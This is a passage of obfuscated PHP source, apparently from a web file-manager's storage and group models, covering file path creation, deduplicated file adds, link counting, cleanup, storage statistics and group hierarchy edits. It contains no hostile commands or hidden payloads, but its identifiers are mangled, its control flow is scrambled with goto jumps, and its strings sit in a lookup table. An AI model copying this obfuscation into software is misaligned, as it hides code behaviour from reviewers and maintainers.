$_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÏ≤ŒúûÑ¡ = IO::init($a´Ÿ‚˘œÇÁ[8]); $fºü«€‘Ö¨ = $this->makeFilePath($dóï©÷˘√ƒ, $dÏ≤ŒúûÑ¡); goto bÇ—Ö“∑ò·; dã€îΩΩ¥ö: if (!$DÂËÏ∆ùΩª && !Cache::get($Cçê‚«€Ç‹)) { $DÂËÏ∆ùΩª = !0; $Fú∏»·ΩÂì = IO::mkdir($Cπàª®Êï†); if (!IO::exist($Fú∏»·ΩÂì . $a´Ÿ‚˘œÇÁ[2153])) { IO::mkfile($Fú∏»·ΩÂì . $a´Ÿ‚˘œÇÁ[2153]); } Cache::set($Cçê‚«€Ç‹, 1, 3600 * 2); } return $fºü«€‘Ö¨; goto dô∞§á°Çæ; dô∞§á°Çæ: } public function makeFilePath($aë»ä©ıØŒ, $f¬Ú§›Ò÷ó) { goto fÛÈÚ‰ÜÎÌ; C√™·∆Ω±ë: switch ($eÙõ◊›πèÀ) { case $b≤†§ﬂØéÎ[2157]: $d≠√∫◊ƒ´∏ = $d≠√∫◊ƒ´∏ . $b≤†§ﬂØéÎ[91] . $f¬Ú§›Ò÷ó->ext($aë»ä©ıØŒ); if ($f¬Ú§›Ò÷ó->ext($aë»ä©ıØŒ) == $b≤†§ﬂØéÎ[2096]) { $d≠√∫◊ƒ´∏ .= $b≤†§ﬂØéÎ[2158]; } break; case $b≤†§ﬂØéÎ[2159]: goto EØÓ∂ê“ˆæ; EØÓ∂ê“ˆæ: $Dè⁄ß∫∞„ß = Model($b≤†§ﬂØéÎ[1092])->get($b≤†§ﬂØéÎ[1337]); $e‘ôÏ°î¡Â = substr(md5($b≤†§ﬂØéÎ[1915] . $Dè⁄ß∫∞„ß . date($b≤†§ﬂØéÎ[687])), 0, 8); $FÏÛê”°éè = KodIO::defaultIO() . date($b≤†§ﬂØéÎ[2160]) . $e‘ôÏ°î¡Â . $b≤†§ﬂØéÎ[8]; goto eÀœñ‹Îë; bü£æÇô‘ú: break; goto A∫éÁÈ∑πµ; eÀœñ‹Îë: if ($f¬Ú§›Ò÷ó->ext($aë»ä©ıØŒ) == $b≤†§ﬂØéÎ[2096]) { $aë»ä©ıØŒ .= $b≤†§ﬂØéÎ[2158]; } $f´±£áƒ∂ç = IO::fileNameAuto($FÏÛê”°éè, $aë»ä©ıØŒ); $d≠√∫◊ƒ´∏ = $FÏÛê”°éè . $f´±£áƒ∂ç; goto bü£æÇô‘ú; A∫éÁÈ∑πµ: case $b≤†§ﬂØéÎ[2156]: break; default: break; } return $d≠√∫◊ƒ´∏; goto DåããøâΩ; fÛÈÚ‰ÜÎÌ: $b≤†§ﬂØéÎ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $eÙõ◊›πèÀ = Model($b≤†§ﬂØéÎ[1092])->get($b≤†§ﬂØéÎ[2154]); $FÏÛê”°éè = KodIO::defaultIO() . date($b≤†§ﬂØéÎ[2155]); goto eäÑ‚É∂–ﬁ; eäÑ‚É∂–ﬁ: $d≠√∫◊ƒ´∏ = $FÏÛê”°éè . rand_string(5) . short_id(100); $aë»ä©ıØŒ = str_replace($b≤†§ﬂØéÎ[8], $b≤†§ﬂØéÎ[70], KodIO::clear($aë»ä©ıØŒ)); if (!$aë»ä©ıØŒ) { $eÙõ◊›πèÀ = $b≤†§ﬂØéÎ[2156]; } goto C√™·∆Ω±ë; DåããøâΩ: } public function addFileByRemote($b‹¯√ÊÉöÔ, $e„±€Ú’ú, $C≈‰ïä¬Û∏ = array()) { goto CÕÆÛèÍÂª; fÿêÈ¬ø≤›: $aŸÔÖòƒ»œ = IO::hashMd5($b‹¯√ÊÉöÔ, $CàÖàÕ≤ƒû); $CÈ®◊∆…Âã = KodIO::defaultDriver(); $dëú¨ﬂÆ€» = array($EÖèÌ¡ú∫´[520] => IO::size($b‹¯√ÊÉöÔ), $EÖèÌ¡ú∫´[2161] => 1, $EÖèÌ¡ú∫´[386] => $e„±€Ú’ú, $EÖèÌ¡ú∫´[744] => $CÈ®◊∆…Âã[$EÖèÌ¡ú∫´[367]], $EÖèÌ¡ú∫´[387] => $b‹¯√ÊÉöÔ, $EÖèÌ¡ú∫´[2162] => $C≈‰ïä¬Û∏[$EÖèÌ¡ú∫´[164]] ? $C≈‰ïä¬Û∏[$EÖèÌ¡ú∫´[164]] : IO::hashSimple($b‹¯√ÊÉöÔ), $EÖèÌ¡ú∫´[2163] => $aŸÔÖòƒ»œ ? $aŸÔÖòƒ»œ : $CàÖàÕ≤ƒû); goto aÒñÜÀ¨¨ú; aÒñÜÀ¨¨ú: if ($a∏ÚÉëââ≥ = $this->addFileCheckExist($dëú¨ﬂÆ€»[$EÖèÌ¡ú∫´[164]], $dëú¨ﬂÆ€»[$EÖèÌ¡ú∫´[163]], $dëú¨ﬂÆ€»[$EÖèÌ¡ú∫´[77]])) { return $a∏ÚÉëââ≥; } return $this->addFileData($dëú¨ﬂÆ€»); goto C∂±ç©Ÿ¿î; CÕÆÛèÍÂª: $EÖèÌ¡ú∫´ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!IO::exist($b‹¯√ÊÉöÔ)) { return !1; } $CàÖàÕ≤ƒû = $C≈‰ïä¬Û∏[$EÖèÌ¡ú∫´[163]] ? $C≈‰ïä¬Û∏[$EÖèÌ¡ú∫´[163]] : $EÖèÌ¡ú∫´[33]; goto fÿêÈ¬ø≤›; C∂±ç©Ÿ¿î: } private function addFileData($eç˜Ù˘ÙÜ∫) { $aÆÉŸÛµ∑‘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$eç˜Ù˘ÙÜ∫) { return !1; } $eç˜Ù˘ÙÜ∫[$aÆÉŸÛµ∑‘[77]] = intval($eç˜Ù˘ÙÜ∫[$aÆÉŸÛµ∑‘[77]]); if (!$eç˜Ù˘ÙÜ∫[$aÆÉŸÛµ∑‘[77]] && strlen($eç˜Ù˘ÙÜ∫[$aÆÉŸÛµ∑‘[164]]) > 32) { $eç˜Ù˘ÙÜ∫[$aÆÉŸÛµ∑‘[77]] = intval(substr($eç˜Ù˘ÙÜ∫[$aÆÉŸÛµ∑‘[164]], 32)); } $còÜÀ®ƒ¯¢ = $this->add($eç˜Ù˘ÙÜ∫); return $this->find($còÜÀ®ƒ¯¢); } public function addFile($D∞ê´Òùéı, $b«πí—ÛÎƒ, $aøÜÈ’ô’ï = false) { $B∫´≤é˘…Ø = IO::hashSimple($D∞ê´Òùéı); $dÏ⁄‡√ì»ˆ = IO::hashMd5($D∞ê´Òùéı); $cìÀ€‰íÖœ = IO::size($D∞ê´Òùéı); if ($AÀ∆¥üû‹À = $this->addFileCheckExist($B∫´≤é˘…Ø, $dÏ⁄‡√ì»ˆ, $cìÀ€‰íÖœ)) { return $AÀ∆¥üû‹À; } $dß Çºº¿ö = $this->addFileMake($D∞ê´Òùéı, $cìÀ€‰íÖœ, $B∫´≤é˘…Ø, $dÏ⁄‡√ì»ˆ, $b«πí—ÛÎƒ, $aøÜÈ’ô’ï); return $this->addFileData($dß Çºº¿ö); } public function addFileMake($E”µ˘‰◊æ, $DÂ∏î≠≈óÀ, $aΩ≠ÁãÀ†›, $B ∂Ÿ∞·óÇ, $a£∆åëîŒ”, $cœÍ÷ñöƒ ) { goto CÈÕ“◊Ïè£; CÈÕ“◊Ïè£: $a¿ÂÚ√Ú◊” =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bÖÃµãÕØ— = $this->createFileName($a£∆åëîŒ”); $B”ï¡ñ¯„ˆ = get_path_father($bÖÃµãÕØ—); goto AÛ‡¯ìå‰û; c∑“ß¶ôù¿: $f£π¯ï•âõ = KodIO::defaultDriver(); $D€∆‰õáµ‚ = array($a¿ÂÚ√Ú◊”[520] => $DÂ∏î≠≈óÀ, $a¿ÂÚ√Ú◊”[2161] => 1, $a¿ÂÚ√Ú◊”[386] => $a£∆åëîŒ”, $a¿ÂÚ√Ú◊”[744] => $f£π¯ï•âõ[$a¿ÂÚ√Ú◊”[367]], $a¿ÂÚ√Ú◊”[387] => $bÖÃµãÕØ—, $a¿ÂÚ√Ú◊”[2162] => $aΩ≠ÁãÀ†›, $a¿ÂÚ√Ú◊”[2163] => $B ∂Ÿ∞·óÇ); return $D€∆‰õáµ‚; goto aËÉ≥á¡’ƒ; AÛ‡¯ìå‰û: $DáÛÙáéÑ∂ = get_path_this($bÖÃµãÕØ—); if ($cœÍ÷ñöƒ ) { $A“Î«™çÿπ = IO::move($E”µ˘‰◊æ, $B”ï¡ñ¯„ˆ, !1, $DáÛÙáéÑ∂); } else { $A“Î«™çÿπ = IO::copy($E”µ˘‰◊æ, $B”ï¡ñ¯„ˆ, !1, $DáÛÙáéÑ∂); } if (!$A“Î«™çÿπ) { return !1; } goto c∑“ß¶ôù¿; aËÉ≥á¡’ƒ: } public function addFileCheckExist($Eô≤¡ãπïä, $BÎñ’‘ØøÇ, $cÌ‘ûÆØÖô) { $Fç†≥áÈ¥Ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $AßÓÚØ”≤≥ = $this->findByHash($Eô≤¡ãπïä, $BÎñ’‘ØøÇ); if (!$AßÓÚØ”≤≥) { return !1; } $BÖ•›¥â‡€ = array($Fç†≥áÈ¥Ÿ[2161] => intval($AßÓÚØ”≤≥[$Fç†≥áÈ¥Ÿ[2164]]) + 1, $Fç†≥áÈ¥Ÿ[520] => $cÌ‘ûÆØÖô); $this->where(array($Fç†≥áÈ¥Ÿ[420] => $AßÓÚØ”≤≥[$Fç†≥áÈ¥Ÿ[419]]))->save($BÖ•›¥â‡€); return $AßÓÚØ”≤≥; } public function remove($Fä•Ë∑¨¥÷) { $this->linkCountChange($Fä•Ë∑¨¥÷, !1); $this->clearEmpty(); return !0; } public function linkAdd($a›ÖµÚ°Ö‡) { $this->linkCountChange($a›ÖµÚ°Ö‡, !0); } public function linkCountChange($båî∞·ôÏ±, $a™©ˆ£≈√œ) { goto F•…äÉ∏Œ£; B§ÕπûÉ∑¶: $f¶™‚ë§∫Ÿ = array(); foreach ($båî∞·ôÏ± as $FÍÆË¿âı˜) { $D”êÔÖñÉÌ = $FÍÆË¿âı˜ . $eÑÏÁâ•∑[33]; if (!$f¶™‚ë§∫Ÿ[$D”êÔÖñÉÌ]) { $f¶™‚ë§∫Ÿ[$D”êÔÖñÉÌ] = 0; } $f¶™‚ë§∫Ÿ[$D”êÔÖñÉÌ]++; } $DæËÜËÇ¬™ = array(); goto F“ñàùÚÛ—; F“ñàùÚÛ—: foreach ($f¶™‚ë§∫Ÿ as $FÍÆË¿âı˜ => $CÊÒÂ’Ö‰ ) { $D”êÔÖñÉÌ = $CÊÒÂ’Ö‰  . $eÑÏÁâ•∑[33]; if (!$DæËÜËÇ¬™[$D”êÔÖñÉÌ]) { $DæËÜËÇ¬™[$D”êÔÖñÉÌ] = array(); } $DæËÜËÇ¬™[$D”êÔÖñÉÌ][] = $FÍÆË¿âı˜; } foreach ($DæËÜËÇ¬™ as $CÊÒÂ’Ö‰  => $AÛËÚ⁄ÕôÖ) { if (!$AÛËÚ⁄ÕôÖ) { continue; } $CÊÒÂ’Ö‰  = $a™©ˆ£≈√œ ? $CÊÒÂ’Ö‰  : -intval($CÊÒÂ’Ö‰ ); $eºãÛ†¶÷Ö = array($eÑÏÁâ•∑[419] => array($eÑÏÁâ•∑[7], $AÛËÚ⁄ÕôÖ)); if ($CÊÒÂ’Ö‰  < 0) { $eºãÛ†¶÷Ö[$eÑÏÁâ•∑[2164]] = array($eÑÏÁâ•∑[933], abs($CÊÒÂ’Ö‰ )); } $this->where($eºãÛ†¶÷Ö)->setAdd($eÑÏÁâ•∑[2164], $CÊÒÂ’Ö‰ ); } goto E¥ãêÛáÖË; F•…äÉ∏Œ£: $eÑÏÁâ•∑ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$båî∞·ôÏ±) { return; } if (!is_array($båî∞·ôÏ±)) { $båî∞·ôÏ± = array($båî∞·ôÏ±); } goto B§ÕπûÉ∑¶; E¥ãêÛáÖË: } public function findByHash($B†ﬁüâá®¬, $E•É√òÕûµ = false) { $Fÿ“Á‡ØŸﬁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$B†ﬁüâá®¬ && !$E•É√òÕûµ) { return !1; } $E‡©∏›µºÎ = array($Fÿ“Á‡ØŸﬁ[2162] => $B†ﬁüâá®¬); if ($E•É√òÕûµ) { $E‡©∏›µºÎ = array($Fÿ“Á‡ØŸﬁ[2163] => $E•É√òÕûµ); } return $this->order($Fÿ“Á‡ØŸﬁ[2165])->where($E‡©∏›µºÎ)->find(); } public function clearEmpty($fÇà¢É¿åó = 0) { goto FˆõËáıº”; FˆõËáıº”: $D⁄Ç∂ ¡∂≥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $fÜÛüå∑›è = time() - 3600 * 24 * $fÇà¢É¿åó; $a§¯≠÷ú¶å = $D⁄Ç∂ ¡∂≥[2166] . $fÜÛüå∑›è; goto fÇÒ∂ÕÕ˜ë; eÜ¨ÑôÀ÷ë: foreach ($d‹á∫ö‰ñÙ as $E‹åœŒßÔ‚) { $E≈âÜÛå©ò->update(1); $this->resetFile($E‹åœŒßÔ‚); } $E≈âÜÛå©ò->end(); goto bÊ‡çÈÁƒ∏; fÇÒ∂ÕÕ˜ë: $d‹á∫ö‰ñÙ = $this->where($a§¯≠÷ú¶å)->select(); if (!$d‹á∫ö‰ñÙ) { return; } $E≈âÜÛå©ò = new Task($D⁄Ç∂ ¡∂≥[2167], $D⁄Ç∂ ¡∂≥[33], count($d‹á∫ö‰ñÙ)); goto eÜ¨ÑôÀ÷ë; bÊ‡çÈÁƒ∏: } private function resetFile($AØÒéŒ™∆¯) { goto dÊ€ﬁàÀÒÖ; CÇ„Ì´ÖíÏ: if ($AØÒéŒ™∆¯[$D€ﬁ¯¨Á”è[2164]] != $F§âÆ≈Îó©) { $this->where($A‹ÒãÂóµ√)->save(array($D€ﬁ¯¨Á”è[2161] => $F§âÆ≈Îó©)); } goto bíﬁ˜ÒÔÓÃ; dÊ€ﬁàÀÒÖ: $D€ﬁ¯¨Á”è =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $A‹ÒãÂóµ√ = array($D€ﬁ¯¨Á”è[420] => $AØÒéŒ™∆¯[$D€ﬁ¯¨Á”è[419]]); $C£“É∆»·á = Model($D€ﬁ¯¨Á”è[1121])->where($A‹ÒãÂóµ√)->count(); goto f‡ÇÉÏãé–; f‡ÇÉÏãé–: $C∞Çæ…‹π˘ = Model($D€ﬁ¯¨Á”è[2168])->where($A‹ÒãÂóµ√)->count(); $F§âÆ≈Îó© = intval($C£“É∆»·á) + intval($C∞Çæ…‹π˘); if ($F§âÆ≈Îó© == 0) { IO::remove($AØÒéŒ™∆¯[$D€ﬁ¯¨Á”è[75]]); $this->where($A‹ÒãÂóµ√)->delete(); $this->metaSet($AØÒéŒ™∆¯[$D€ﬁ¯¨Á”è[419]], null, null); return; } goto CÇ„Ì´ÖíÏ; bíﬁ˜ÒÔÓÃ: } public function storageInfo($a„ã¨á∞Àº = false) { goto fØúÒ÷≥‡—; fØúÒ÷≥‡—: $A´‰≈Ûä⁄« =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $d°’Ÿô∆∏î = $this->count() + 0.0; $b˜µ◊°π∏Ö = 0; goto cØ≠Ã¡≥ª»; cØ≠Ã¡≥ª»: $aë»ÿ© ¶¨ = 1; $AŸÒà◊‰Ó’ = 0; $cÁ€µ†Ï…ü = 5000; goto dßúìÚ‚Úœ; dßúìÚ‚Úœ: for ($cãÓâ…ó√Ï = 0; $cãÓâ…ó√Ï < $d°’Ÿô∆∏î; $cãÓâ…ó√Ï = $cãÓâ…ó√Ï + $cÁ€µ†Ï…ü) { $C·ãÂ°◊‡‹ = $this->limit($cãÓâ…ó√Ï, $cãÓâ…ó√Ï + $cÁ€µ†Ï…ü)->select(); foreach ($C·ãÂ°◊‡‹ as $f˘ó˘±∞¬„) { $aë»ÿ© ¶¨ += $f˘ó˘±∞¬„[$A´‰≈Ûä⁄«[77]] * $f˘ó˘±∞¬„[$A´‰≈Ûä⁄«[2164]]; $b˜µ◊°π∏Ö += $f˘ó˘±∞¬„[$A´‰≈Ûä⁄«[77]] * ($f˘ó˘±∞¬„[$A´‰≈Ûä⁄«[2164]] - 1); $AŸÒà◊‰Ó’ += $f˘ó˘±∞¬„[$A´‰≈Ûä⁄«[2164]]; } } $b—›¬ƒ™Ç = array($A´‰≈Ûä⁄«[2169] => $aë»ÿ© ¶¨, $A´‰≈Ûä⁄«[2170] => $b˜µ◊°π∏Ö, $A´‰≈Ûä⁄«[2171] => $b˜µ◊°π∏Ö / $aë»ÿ© ¶¨, $A´‰≈Ûä⁄«[81] => $d°’Ÿô∆∏î, $A´‰≈Ûä⁄«[2172] => $AŸÒà◊‰Ó’); return $b—›¬ƒ™Ç; goto có±∞®È”¡; có±∞®È”¡: } } class GroupModel extends ModelBase { protected $tableName = "\x67\x72\157\x75\160"; protected $tableMeta = array("\164\141\x62\154\145\x4e\141\155\x65" => "\x67\x72\157\x75\x70\137\x6d\145\x74\141", "\x6d\x65\x74\141\x46\x69\145\x6c\x64" => "\x67\x72\157\x75\160\x49\x44"); protected function cacheFunctionAlias($a ’ÚÚàû) { $eÖœÙë¡åı =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return array($eÖœÙë¡åı[2173] => array($a ’ÚÚàû[0], $eÖœÙë¡åı[2174]), $eÖœÙë¡åı[2175] => array($a ’ÚÚàû[0], $eÖœÙë¡åı[2174])); } protected function getInfo($dõ≥∫ﬂ´∂—) { $DΩ∂ÁûÀ˜Ï = $this->getInfoSimple($dõ≥∫ﬂ´∂—); if (!$DΩ∂ÁûÀ˜Ï) { return !1; } return $this->_listDataApplyItem($DΩ∂ÁûÀ˜Ï); } protected function getInfoSimple($déŸå’◊÷ﬂ, $eÏÀê†Õéª = false) { $F‘≠Öíã§— =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($eÏÀê†Õéª) { $fÔó¬®ÊÏ£ = array($F‘≠Öíã§—[2106] => intval($déŸå’◊÷ﬂ)); $dÛãÖ∆±‚ˆ = $this->where($fÔó¬®ÊÏ£)->find(); return is_array($dÛãÖ∆±‚ˆ) ? $dÛãÖ∆±‚ˆ : array(); } return $this->cacheFunctionGet($F‘≠Öíã§—[2176], $déŸå’◊÷ﬂ); } protected function groupAdd($aÀ§Ñö—∑«) { goto d¢’ƒ«Àçé; d¢’ƒ«Àçé: $bä˜ô∏ïºí =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$aÀ§Ñö—∑«[$bä˜ô∏ïºí[461]] && isset($aÀ§Ñö—∑«[$bä˜ô∏ïºí[2106]]) && $aÀ§Ñö—∑«[$bä˜ô∏ïºí[2106]] == 1) { if ($bø∑œÉåÙó = $this->getInfoSimple($aÀ§Ñö—∑«[$bä˜ô∏ïºí[2106]], !0)) { return $aÀ§Ñö—∑«[$bä˜ô∏ïºí[2106]]; } } else { $bø∑œÉåÙó = $this->getInfoSimple($aÀ§Ñö—∑«[$bä˜ô∏ïºí[461]]); if (!$bø∑œÉåÙó) { return !1; } } $BÛÂû˘ÜóÁ = $bä˜ô∏ïºí[470]; goto dßﬁØÀç•È; aìøü£é§É: if (!empty($aÀ§Ñö—∑«[$bä˜ô∏ïºí[2106]])) { $cÉ¶≤Ñå¬Ü[$bä˜ô∏ïºí[2106]] = $aÀ§Ñö—∑«[$bä˜ô∏ïºí[2106]]; } $C∫Ÿ˜ÔèÒá = $this->add($cÉ¶≤Ñå¬Ü); $this->setNamePinyin($C∫Ÿ˜ÔèÒá, $cÉ¶≤Ñå¬Ü[$bä˜ô∏ïºí[28]]); goto E¨™—àÊ∂∆; E¨™—àÊ∂∆: Model($bä˜ô∏ïºí[1121])->groupRootAdd($C∫Ÿ˜ÔèÒá); return $C∫Ÿ˜ÔèÒá; goto cŸüﬂ“öç‰; dßﬁØÀç•È: if ($bø∑œÉåÙó[$bä˜ô∏ïºí[459]]) { $BÛÂû˘ÜóÁ = $bø∑œÉåÙó[$bä˜ô∏ïºí[459]] . $bø∑œÉåÙó[$bä˜ô∏ïºí[2106]] . $bä˜ô∏ïºí[47]; } $cÉ¶≤Ñå¬Ü = array($bä˜ô∏ïºí[386] => $this->groupNameAuto($aÀ§Ñö—∑«[$bä˜ô∏ïºí[461]], $aÀ§Ñö—∑«[$bä˜ô∏ïºí[28]]), $bä˜ô∏ïºí[368] => $aÀ§Ñö—∑«[$bä˜ô∏ïºí[461]], $bä˜ô∏ïºí[525] => $BÛÂû˘ÜóÁ, $bä˜ô∏ïºí[2177] => $aÀ§Ñö—∑«[$bä˜ô∏ïºí[2090]], $bä˜ô∏ïºí[2178] => 0, $bä˜ô∏ïºí[2110] => 0); if (isset($aÀ§Ñö—∑«[$bä˜ô∏ïºí[2127]])) { $cÉ¶≤Ñå¬Ü[$bä˜ô∏ïºí[2127]] = $aÀ§Ñö—∑«[$bä˜ô∏ïºí[2127]]; } else { $C‰Ö¿àÑ°§ = $this->max($bä˜ô∏ïºí[2127]); if (!$C‰Ö¿àÑ°§) { $C‰Ö¿àÑ°§ = 0; } $cÉ¶≤Ñå¬Ü[$bä˜ô∏ïºí[2127]] = $C‰Ö¿àÑ°§ + 1; } goto aìøü£é§É; cŸüﬂ“öç‰: } protected function groupEdit($C¶Î›ááÜﬁ, $fï‡£∏ÿÎ¶) { $a‡Úõ…ùòû =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!empty($fï‡£∏ÿÎ¶[$a‡Úõ…ùòû[461]])) { $Fãî“õ°°© = $this->getInfoSimple($C¶Î›ááÜﬁ); $bó’ä»¨ì˜ = $this->getInfoSimple($fï‡£∏ÿÎ¶[$a‡Úõ…ùòû[461]]); if (!$Fãî“õ°°© || !$bó’ä»¨ì˜) { return !1; } if ($Fãî“õ°°©[$a‡Úõ…ùòû[2106]] == $bó’ä»¨ì˜[$a‡Úõ…ùòû[2106]]) { return !1; } if ($fï‡£∏ÿÎ¶[$a‡Úõ…ùòû[461]] != $Fãî“õ°°©[$a‡Úõ…ùòû[461]]) { if ($bó’ä»¨ì˜[$a‡Úõ…ùòû[459]] !== $Fãî“õ°°©[$a‡Úõ…ùòû[459]] && strpos($bó’ä»¨ì˜[$a‡Úõ…ùòû[459]], $Fãî“õ°°©[$a‡Úõ…ùòû[459]] . $Fãî“õ°°©[$a‡Úõ…ùòû[2106]] . $a‡Úõ…ùòû[47]) === 0) { return !1; } $fï‡£∏ÿÎ¶[$a‡Úõ…ùòû[525]] = $bó’ä»¨ì˜[$a‡Úõ…ùòû[459]] . $fï‡£∏ÿÎ¶[$a‡Úõ…ùòû[461]] . $a‡Úõ…ùòû[47]; $this->_changeChildLevel($Fãî“õ°°©, $bó’ä»¨ì˜); } } if (isset($fï‡£∏ÿÎ¶[$a‡Úõ…ùòû[28]])) { $this->setNamePinyin($C¶Î›ááÜﬁ, $fï‡£∏ÿÎ¶[$a‡Úõ…ùòû[28]]); } return $this->where(array($a‡Úõ…ùòû[2179] => $C¶Î›ááÜﬁ))->save($fï‡£∏ÿÎ¶); } private function _changeChildLevel($AÈâë•˜Îí, $C±òêüÀ‚Ã, $Eæ∂£≥à¢Ù = false) { goto cê˜úÀÊØÛ; cê˜úÀÊØÛ: $e∏∆±È·«≤ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $C™´˜õ◊éÏ = $AÈâë•˜Îí[$e∏∆±È·«≤[459]] . $AÈâë•˜Îí[$e∏∆±È·«≤[2106]] . $e∏∆±È·«≤[47]; $dê∫º¨ßÕÎ = $C±òêüÀ‚Ã[$e∏∆±È·«≤[459]] . $C±òêüÀ‚Ã[$e∏∆±È·«≤[2106]] . $e∏∆±È·«≤[47] . $AÈâë•˜Îí[$e∏∆±È·«≤[2106]] . $e∏∆±È·«≤[47]; goto AËÇÿ·∞¿∏; dÓ›“Ì«∏©: $this->where($dâòæÉƒ¢À)->data($C¡ò∑ÿﬁÎë)->save(); goto f‚÷∞·≥Úº; AËÇÿ·∞¿∏: if ($Eæ∂£≥à¢Ù) { $dê∫º¨ßÕÎ = $C±òêüÀ‚Ã[$e∏∆±È·«≤[459]] . $C±òêüÀ‚Ã[$e∏∆±È·«≤[2106]] . $e∏∆±È·«≤[47]; } $dâòæÉƒ¢À = array($e∏∆±È·«≤[525] => array($e∏∆±È·«≤[483], $AÈâë•˜Îí[$e∏∆±È·«≤[459]] . $AÈâë•˜Îí[$e∏∆±È·«≤[2106]] . $e∏∆±È·«≤[484])); $C¡ò∑ÿﬁÎë = array($e∏∆±È·«≤[525] => array($e∏∆±È·«≤[534], "\x72\x65\x70\154\x61\143\x65\50\x70\x61\162\145\x6e\164\x4c\145\x76\145\154\54\x27{$C™´˜õ◊éÏ}\47\54\x27{$dê∫º¨ßÕÎ}\x27\x29")); goto dÓ›“Ì«∏©; f‚÷∞·≥Úº: } public function setNamePinyin($FÊ†á√Öœ, $Fë™„õöúœ = false) { $eÇù£Öﬂø =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$Fë™„õöúœ) { $a”†îìèÍú = $this->getInfoSimple($FÊ†á√Öœ); $Fë™„õöúœ = $a”†îìèÍú[$eÇù£Öﬂø[28]]; } if (!Input::check($Fë™„õöúœ, $eÇù£Öﬂø[528])) { $this->metaSet($FÊ†á√Öœ, $eÇù£Öﬂø[416], null); $this->metaSet($FÊ†á√Öœ, $eÇù£Öﬂø[415], null); return; } $eã∑…Ÿ≥èí = array($eÇù£Öﬂø[416] => str_replace($eÇù£Öﬂø[50], $eÇù£Öﬂø[33], Pinyin::encode($Fë™„õöúœ)), $eÇù£Öﬂø[415] => Pinyin::encode($Fë™„õöúœ, $eÇù£Öﬂø[529])); $this->metaSet($FÊ†á√Öœ, $eã∑…Ÿ≥èí); } protected function groupStatus($C•ü»óçÂÿ, $d‡ŸÖ◊çÜÖ) { goto AÎœ¶ÃáòÉ; aﬁÑ©ô©ç™: if ($d‡ŸÖ◊çÜÖ == $déÇ¥ÚÚèé[83]) { $dÑèÜøé°¬ = $this->parentLevelArray($Büﬁçÿ√áõ[$déÇ¥ÚÚèé[459]]); } else { $f˜Ω»Î◊®ö = array($déÇ¥ÚÚèé[525] => array($déÇ¥ÚÚèé[483], $Büﬁçÿ√áõ[$déÇ¥ÚÚèé[459]] . $Büﬁçÿ√áõ[$déÇ¥ÚÚèé[2106]] . $déÇ¥ÚÚèé[484])); $dÑèÜøé°¬ = $this->where($f˜Ω»Î◊®ö)->field($déÇ¥ÚÚèé[2106])->select(); $dÑèÜøé°¬ = array_to_keyvalue($dÑèÜøé°¬, $déÇ¥ÚÚèé[33], $déÇ¥ÚÚèé[2106]); } $dÑèÜøé°¬[] = $Büﬁçÿ√áõ[$déÇ¥ÚÚèé[2106]]; $bœîçòˆ∆ı = array(); goto F¨ﬂÖÎ©€ã; AÎœ¶ÃáòÉ: $déÇ¥ÚÚèé =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $Büﬁçÿ√áõ = $this->getInfoSimple($C•ü»óçÂÿ); if (!$Büﬁçÿ√áõ) { return !1; } goto aﬁÑ©ô©ç™; F¨ﬂÖÎ©€ã: foreach ($dÑèÜøé°¬ as $C•ü»óçÂÿ) { $bœîçòˆ∆ı[] = array($déÇ¥ÚÚèé[2106] => $C•ü»óçÂÿ, $déÇ¥ÚÚèé[89] => $déÇ¥ÚÚèé[689], $déÇ¥ÚÚèé[359] => $d‡ŸÖ◊çÜÖ); } return Model($déÇ¥ÚÚèé[2180])->addAll($bœîçòˆ∆ı, array(), !0); goto DΩ»‡¿òÂñ; DΩ»‡¿òÂñ: } private function _groupStatusApply($eÆ‡äßë∫ô, $EÌÂ¨Àüèı) { $E∏òäåÊó° =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($EÌÂ¨Àüèı == $E∏òäåÊó°[83]) { $A‘ûï≠£ôÉ = $this->parentLevelArray($eÆ‡äßë∫ô[$E∏òäåÊó°[459]]); } else { $aÛª Û‡˜∆ = array($E∏òäåÊó°[525] => array($E∏òäåÊó°[483], $eÆ‡äßë∫ô[$E∏òäåÊó°[459]] . $eÆ‡äßë∫ô[$E∏òäåÊó°[2106]] . $E∏òäåÊó°[484])); $A‘ûï≠£ôÉ = $this->where($aÛª Û‡˜∆)->field($E∏òäåÊó°[2106])->select(); $A‘ûï≠£ôÉ = array_to_keyvalue($A‘ûï≠£ôÉ, $E∏òäåÊó°[33], $E∏òäåÊó°[2106]); } if (empty($A‘ûï≠£ôÉ)) { return; } $AÈä¶ÉªÛ = array(); foreach ($A‘ûï≠£ôÉ as $dà“‹ÊûÕπ) { $AÈä¶ÉªÛ[] = array($E∏òäåÊó°[2106] => $dà“‹ÊûÕπ, $E∏òäåÊó°[89] => $E∏òäåÊó°[689], $E∏òäåÊó°[359] => $EÌÂ¨Àüèı); } Model($E∏òäåÊó°[2180])->addAll($AÈä¶ÉªÛ, array(), !0); } protected function groupRemove($b∞ßè‰π∞∂) { goto F·›Ó¢¥üê; a¶ÂËíê¢ì: if (!$EÇö—Òœ±û || $EÇö—Òœ±û[$bÏÆçÈèÎÜ[461]] == 0) { return !1; } $CæÇù”ºÖÀ = $this->getInfoSimple($EÇö—Òœ±û[$bÏÆçÈèÎÜ[461]]); $this->_changeChildLevel($EÇö—Òœ±û, $CæÇù”ºÖÀ, !0); goto b∏çŒ˘”‡´; c©ëç¡˜†√: Model($bÏÆçÈèÎÜ[761])->groupRootRemove($b∞ßè‰π∞∂); return $this->where($F€° ﬁÁéΩ)->delete(); goto a—ÁŒﬁ≤÷’; 